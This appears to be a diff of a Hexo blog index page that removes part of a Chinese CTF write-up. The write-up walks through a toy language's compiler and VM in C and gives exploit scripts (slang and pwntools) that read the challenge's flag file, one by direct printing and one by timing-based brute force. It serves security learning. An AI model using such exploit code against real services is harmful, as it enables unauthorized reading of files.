-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> map(var, TYPE, type)                                                 \</span></span><br><span class="line"><span class="meta">    case AST_##TYPE:                                                         \</span></span><br><span class="line"><span class="meta">        compile_##type((var), lambda);                                       \</span></span><br><span class="line"><span class="meta">        break</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> map(OPCODE, opcode)                                                 \</span></span><br><span class="line"><span class="meta">    case OP_##OPCODE:                                                         \</span></span><br><span class="line"><span class="meta">        emit_insn_##opcode(this, ast);                                       \</span></span><br><span class="line"><span class="meta">        break</span></span><br></pre></td></tr></table></figure>
-<p>起始函数如下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">back_process</span><span class="params">(<span class="keyword">ast_t</span>* m, <span class="keyword">char</span> * scom_file)</span></span>&#123;</span><br><span class="line">    FILE * out = fopen(scom_file, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">lambda_t</span> *l = lambda_init();</span><br><span class="line">    compile_stmts(m, l);</span><br><span class="line">    save_scom(l, out);</span><br><span class="line">    fclose(out);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">compile_stmts</span><span class="params">(arg)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">ast_t</span>*child = <span class="literal">NULL</span>;</span><br><span class="line">    ast_each_child(ast, i, child) <span class="comment">/* 遍历AST */</span></span><br><span class="line">        compile_stmt(child, lambda); <span class="comment">/* 处理语句stmt */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>处理语句 stmt：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">compile_stmt</span><span class="params">(arg)</span></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>(ast-&gt;type)&#123;</span><br><span class="line">        <span class="built_in">map</span>(ast, EXPR, expr); <span class="comment">/* 处理表达式 */</span></span><br><span class="line">        <span class="built_in">map</span>(ast, FUNCTION, function); <span class="comment">/* 处理函数调用 */</span></span><br><span class="line">        <span class="built_in">map</span>(ast, WANT, want); <span class="comment">/* 处理want语句 */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>处理函数调用：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">compile_function</span><span class="params">(arg)</span></span>&#123;</span><br><span class="line">    <span class="keyword">ast_t</span> *func = ast_get_child(ast, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">ast_t</span> *arg1 = ast_get_child(ast, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">ast_t</span> *arg2 = ast_get_child(ast, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">ast_t</span> *arg3 = ast_get_child(ast, <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    emit_insn(OP_LOAD_WORD, arg1); <span class="comment">/* 处理第1个参数 */</span></span><br><span class="line">    emit_insn(OP_LOAD_WORD, arg2); <span class="comment">/* 处理第2个参数 */</span></span><br><span class="line">    emit_insn(OP_LOAD_WORD, arg3); <span class="comment">/* 处理第3个参数 */</span></span><br><span class="line"></span><br><span class="line">    emit_insn_call(lambda, func); <span class="comment">/* 处理函数调用 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ast_get_child_count(ast) == <span class="number">5</span>)&#123;</span><br><span class="line">        <span class="keyword">ast_t</span> *ret = ast_get_child(ast, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span> (ret-&gt;type == AST_WORD)</span><br><span class="line">            emit_insn(OP_STORE, ret);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>其实底层就是把 AST 转化为虚拟机能理解的代码</li>
-</ul>
-<p>处理 want 语句：（底层比较辅助，将其理解为 IF 语句就好了）</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">compile_want</span><span class="params">(<span class="keyword">ast_t</span> *ast, <span class="keyword">lambda_t</span> *lambda)</span></span>&#123;</span><br><span class="line">    <span class="keyword">ast_t</span> *word = ast_get_child(ast, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">ast_t</span> *lists = ast_get_child(ast, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">ast_t</span> *<span class="built_in">list</span>;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> start = lambda_get_code_count(lambda);</span><br><span class="line">    ast_each_child(lists, i, <span class="built_in">list</span>)</span><br><span class="line">        compile_list(<span class="built_in">list</span>, lambda, word, start); <span class="comment">/* 处理复合语句 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>但语义分析完毕以后，源程序就被转化为虚拟机代码</p>
-<p>在如下函数中被执行：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vm_call_lambda</span><span class="params">(<span class="keyword">lambda_t</span> *l)</span></span>&#123;</span><br><span class="line">    <span class="keyword">runtime_t</span> *r = runtime_init();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// gift to Christmas Bash!</span></span><br><span class="line">    <span class="comment">// Don&#x27;t play too late for the party! Remember to sleep!</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// gift_t * gift = gift_init(&quot;sleep&quot;, sleep);</span></span><br><span class="line">    <span class="comment">// runtime_set_gift(r, gift);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(r-&gt;is_run)&#123;</span><br><span class="line">        <span class="keyword">switch</span>(get_code)&#123;</span><br><span class="line">            display(STORE, store);</span><br><span class="line">            display(LOAD_NUMBER, load_number);</span><br><span class="line">            display(LOAD_STRING, load_string);</span><br><span class="line">            display(LOAD_WORD, load_word);</span><br><span class="line"></span><br><span class="line">            display(CALL, call);</span><br><span class="line">            display(JZ, jz);</span><br><span class="line">            display(JMP, jmp);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">operator</span>(ADD);</span><br><span class="line">            <span class="keyword">operator</span>(SUB);</span><br><span class="line">            <span class="keyword">operator</span>(DIV);</span><br><span class="line">            <span class="keyword">operator</span>(MUL);</span><br><span class="line">            <span class="keyword">operator</span>(GRAETER);</span><br><span class="line">            <span class="keyword">operator</span>(EQUAL);</span><br><span class="line">        &#125;</span><br><span class="line">        check_next(r, l);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><strong>入侵思路</strong></p>
-<p>本题目提供了 read open 函数，有这两个函数就可以把 flag 读取到本地内存</p>
-<p>然后 open flag，在 open 失败后会进行打印，可以把 flag 打印出来</p>
-<p>完整 exp： </p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gift <span class="literal">NULL</span> is <span class="number">0</span>;</span><br><span class="line">gift FD is <span class="number">0</span>;</span><br><span class="line">gift C is <span class="number">4096</span>;</span><br><span class="line">gift RN is <span class="number">32</span>;</span><br><span class="line">gift E is <span class="number">0</span>;</span><br><span class="line">reindeer EQQIE delivering gift <span class="literal">NULL</span> <span class="literal">NULL</span> <span class="literal">NULL</span> brings back gift LEAK;</span><br><span class="line">gift BUF is LEAK+<span class="number">12288</span>;</span><br><span class="line"></span><br><span class="line">reindeer Dasher delivering gift FD BUF RN;</span><br><span class="line"></span><br><span class="line">reindeer Dancer delivering gift BUF <span class="literal">NULL</span> <span class="literal">NULL</span> brings back gift FILEFD;</span><br><span class="line">gift FLAGLEN is <span class="number">30</span>;</span><br><span class="line">reindeer Dasher delivering gift FILEFD BUF FLAGLEN;</span><br><span class="line">reindeer Dancer delivering gift BUF <span class="literal">NULL</span> <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&quot;124.71.144.133&quot;, 2144)</span></span><br><span class="line">p = process([<span class="string">&quot;python3&quot;</span>, <span class="string">&quot;server.py&quot;</span>])</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./exp.slang&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    p.sendline(f.read())</span><br><span class="line">p.sendline(<span class="string">b&quot;EOF&quot;</span>)</span><br><span class="line"></span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">b&quot;./flag\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p>还有一种思路是利用 Want 语句爆破 flag，exp 如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">dic = string.ascii_letters + string.digits + <span class="string">&quot;_&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(dic)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;SCTF&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">21</span>-<span class="number">5</span>-<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> dic:</span><br><span class="line">        tmp = flag + ch</span><br><span class="line">        slang_file = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">gift stdout is 1;</span></span><br><span class="line"><span class="string">gift flag is &quot;./flag&quot;;</span></span><br><span class="line"><span class="string">gift buf is &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;</span></span><br><span class="line"><span class="string">gift size is 40;</span></span><br><span class="line"><span class="string">gift none is 0;</span></span><br><span class="line"><span class="string">gift fd is 0;</span></span><br><span class="line"><span class="string">gift len is &#123;&#125;;</span></span><br><span class="line"><span class="string">gift guess is &quot;&#123;&#125;&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">reindeer Dancer delivering gift flag none none brings back gift fd;</span></span><br><span class="line"><span class="string">reindeer Dasher delivering gift fd buf size;</span></span><br><span class="line"><span class="string">reindeer Prancer delivering gift buf guess len brings back gift success;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">this family wants gift success</span></span><br><span class="line"><span class="string">    if the gift equal to 0:</span></span><br><span class="line"><span class="string">        gift a is 1;</span></span><br><span class="line"><span class="string">        Brave reindeer! Fear no difficulties!</span></span><br><span class="line"><span class="string">ok, they should already have a gift;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>.<span class="built_in">format</span>(i+<span class="number">5</span>+<span class="number">1</span>, tmp)</span><br><span class="line">        cn = process(<span class="string">&quot;python3 server.py&quot;</span>.split(<span class="string">&quot; &quot;</span>))</span><br><span class="line">        cn.recvuntil(<span class="string">&quot;===== Enter partial source for edge compute app (EOF to finish):&quot;</span>)</span><br><span class="line">        cn.sendline(slang_file.encode())</span><br><span class="line">        start = time.time()</span><br><span class="line">        cn.recvuntil(<span class="string">&quot;===== Test complete!&quot;</span>)</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">int</span>(end - start) == <span class="number">1</span>):</span><br><span class="line">            flag += ch</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] -get: &quot;</span>, flag)</span><br><span class="line">            cn.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        cn.close()</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/3/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/27/">27</a><a class="extend next" rel="next" href="/page/5/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+    <a class="extend prev" rel="prev" href="/page/3/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/28/">28</a><a class="extend next" rel="next" href="/page/5/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
   </nav>
 
 
@@ -2243,7 +2231,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">270</span>
+          <span class="site-state-item-count">271</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -2292,12 +2280,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="Symbols count total">3.6m</span>
+    <span title="Symbols count total">3.7m</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">55:10</span>
+    <span title="Reading time total">55:20</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
   </div>
